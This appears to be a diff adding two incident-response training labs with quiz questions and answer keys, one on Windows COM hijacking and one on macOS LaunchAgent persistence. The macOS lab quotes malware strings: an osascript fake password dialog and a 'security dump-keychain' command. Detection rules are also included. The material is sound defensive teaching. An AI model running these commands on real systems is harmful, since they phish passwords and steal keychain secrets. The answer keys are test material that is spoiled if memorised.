+    briefing: 'An implant on a workstation comes back after every reboot, but no Run keys, services, scheduled tasks, or WMI subscriptions were found. The process always starts inside explorer.exe shortly after logon. Investigate COM object hijacking.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Compare HKCU and HKLM',
+        evidence: r`reg query "HKCU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32"
+    (Default)    REG_SZ    C:\Users\k.ito\AppData\Local\Microsoft\Edge\edgeupd.dll
+reg query "HKLM\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32"
+    (Default)    REG_SZ    %SystemRoot%\system32\shell32.dll`,
+        question: 'Why does the HKCU entry take effect?',
+        options: [
+          'Both load at the same time',
+          'HKLM is ignored on workstations',
+          'HKCU requires admin rights',
+          'Windows checks the user\'s HKCU class registrations before HKLM, so a per-user entry overrides the system COM server',
+        ],
+        correctIndex: 3,
+        hint: 'HKCR merges HKCU over HKLM.',
+        walkthrough: 'The merged HKEY_CLASSES_ROOT view prefers HKCU. Any user can register a COM server there that replaces the system one for that user, without admin rights.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Understand the trigger',
+        evidence: r`Sysmon Event 7 (Image loaded)
+explorer.exe loaded C:\Users\k.ito\AppData\Local\Microsoft\Edge\edgeupd.dll  Signed: false
+Time: 30 seconds after logon`,
+        question: 'Why does the DLL load at every logon?',
+        options: [
+          'A service starts it',
+          'The user runs it manually',
+          'Explorer instantiates that COM object during startup, so it loads the hijacked DLL each time',
+          'It is a driver',
+        ],
+        correctIndex: 2,
+        hint: 'Pick a CLSID that is used often.',
+        walkthrough: 'Attackers choose COM objects that common processes like explorer.exe load routinely. The implant then starts inside a trusted process at every logon.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Hunt for hijacks',
+        evidence: r`Hunt logic
+For each CLSID under HKCU\Software\Classes\CLSID with InprocServer32 or LocalServer32:
+  compare to HKLM entry; flag if HKLM exists and paths differ, or path is in user-writable folder`,
+        question: 'Why focus on user-writable paths?',
+        options: [
+          'Only system32 DLLs can be malicious',
+          'Legitimate per-user COM registrations exist, but system CLSIDs pointing to DLLs in AppData or Temp are a strong indicator of hijacking',
+          'User folders cannot hold DLLs',
+          'To speed up the scan',
+        ],
+        correctIndex: 1,
+        hint: 'Reduce false positives.',
+        walkthrough: 'Some applications register per-user COM objects legitimately. Overrides of system CLSIDs with unsigned DLLs in user-writable paths are the high-signal subset.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Eradicate',
+        evidence: 'Found on 3 hosts: same CLSID override, same unsigned DLL hash',
+        question: 'What is the correct cleanup?',
+        options: [
+          'Delete the HKLM key',
+          'Delete the HKCU CLSID keys and DLLs on all three hosts, kill the injected process, and investigate the initial access and user credentials',
+          'Reinstall Edge',
+          'Only delete the DLL',
+        ],
+        correctIndex: 1,
+        hint: 'Deleting the DLL alone may break Explorer.',
+        walkthrough: 'Removing the HKCU override restores the system COM server. Deleting only the DLL can cause errors. Then address how the attacker got in.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Detect going forward',
+        evidence: r`Detection
+- Sysmon Event 13 (registry value set) on HKCU\Software\Classes\CLSID\*\InprocServer32
+- Alert when explorer.exe or other system processes load unsigned DLLs from user profiles`,
+        question: 'Why monitor registry writes as well as DLL loads?',
+        options: [
+          'It doubles the cost with no benefit',
+          'Registry writes are rare for all keys',
+          'DLL loads cannot be logged',
+          'Registry writes catch the persistence when it is created, before the next logon, while image loads catch it when it runs',
+        ],
+        correctIndex: 3,
+        hint: 'Detect at creation and at execution.',
+        walkthrough: 'Two detection points give earlier warning and resilience if one is missed. Tune for known legitimate per-user COM registrations.',
+      },
+    ],
+  },
+  {
+    id: 'lab-121',
+    title: 'macOS LaunchAgent Persistence',
+    domain: 5,
+    difficulty: 'Easy',
+    xpReward: 250,
+    briefing: 'A designer\'s MacBook pops up a fake system password prompt each morning, and network monitoring shows it contacting an unknown domain. The user installed a cracked font manager last week. Investigate macOS persistence.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'List user launch agents',
+        evidence: r`$ ls -la ~/Library/LaunchAgents/
+-rw-r--r--  com.apple.fontd.helper.plist   Nov 20 10:14
+-rw-r--r--  com.google.keystone.agent.plist Mar 02 09:01
+$ plutil -p ~/Library/LaunchAgents/com.apple.fontd.helper.plist
+"Label" => "com.apple.fontd.helper"
+"ProgramArguments" => ["/Users/s.berg/Library/Application Support/.fontd/fontd"]
+"RunAtLoad" => 1
+"KeepAlive" => 1`,
+        question: 'Why is com.apple.fontd.helper suspicious?',
+        options: [
+          'It uses an Apple-like name but lives in the user\'s folder and runs a hidden binary from Application Support',
+          'Apple installs it on all Macs',
+          'It is a Google updater',
+          'It is disabled',
+        ],
+        correctIndex: 0,
+        hint: 'Apple system agents live in /System/Library.',
+        walkthrough: 'Malware often mimics Apple naming. Real Apple agents reside in system-protected paths. RunAtLoad and KeepAlive make it start at login and restart if killed.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Check the binary',
+        evidence: r`$ codesign -dv "/Users/s.berg/Library/Application Support/.fontd/fontd"
+code object is not signed at all
+$ xattr -l ".../fontd"
+(no com.apple.quarantine attribute)`,
+        question: 'Why does the missing quarantine attribute matter?',
+        options: [
+          'It means Apple approved the file',
+          'Files downloaded through a browser get the quarantine flag that triggers Gatekeeper checks; a dropped file without it avoided those checks',
+          'It means the file is encrypted',
+          'Quarantine only applies to iOS',
+        ],
+        correctIndex: 1,
+        hint: 'How does Gatekeeper know what to check?',
+        walkthrough: 'Gatekeeper evaluates quarantined files. Payloads written by an already-running installer often lack the attribute, so they never get checked. An unsigned binary is another red flag.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Understand the password prompt',
+        evidence: r`fontd strings (excerpt)
+osascript -e 'display dialog "macOS needs your password to apply system updates" default answer "" with hidden answer'
+security dump-keychain`,
+        question: 'What is the malware trying to do?',
+        options: [
+          'Install real updates',
+          'Phish the user\'s login password with a fake dialog to unlock and steal Keychain contents',
+          'Change the wallpaper',
+          'Back up fonts',
+        ],
+        correctIndex: 1,
+        hint: 'AppleScript can show any dialog.',
+        walkthrough: 'Infostealers show fake prompts to collect the password, then use it to read the login keychain, which holds saved passwords and tokens. If the user typed it, assume keychain secrets are stolen.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Contain',
+        evidence: r`User confirms typing password into the dialog twice.
+Keychain contains: work SSO cookies (browser), Wi-Fi passwords, VPN profile`,
+        question: 'What should the response include?',
+        options: [
+          'Isolate the Mac, remove the agent and binary (or reimage), reset the user\'s password, revoke SSO sessions, and rotate VPN and saved credentials',
+          'Only delete the plist',
+          'Only change the Mac\'s wallpaper',
+          'Wait for the next prompt',
+        ],
+        correctIndex: 0,
+        hint: 'The password and keychain are exposed.',
+        walkthrough: 'Removing persistence is not enough when credentials were captured. Session revocation, password reset, and rotating other stored credentials are required. Reimaging is the safest option.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Harden the fleet',
+        evidence: r`MDM options
+- Block unsigned apps; allow only App Store and identified developers
+- Background task management notifications (macOS 13+) reported to MDM
+- EDR alert on new LaunchAgents outside approved list
+- Deny local admin for standard users`,
+        question: 'Why do background task notifications help?',
+        options: [
+          'They speed up startup',
+          'They block all apps',
+          'macOS alerts users and can report to MDM when a new login item or launch agent is added, revealing persistence quickly',
+          'They disable LaunchAgents',
+        ],
+        correctIndex: 2,
+        hint: 'New persistence becomes visible.',
+        walkthrough: 'Since macOS Ventura, adding background items triggers notifications and is visible to MDM. Combined with app restrictions and EDR rules on LaunchAgents, persistence like this is caught early.',
+      },
+    ],
+  },
 ];
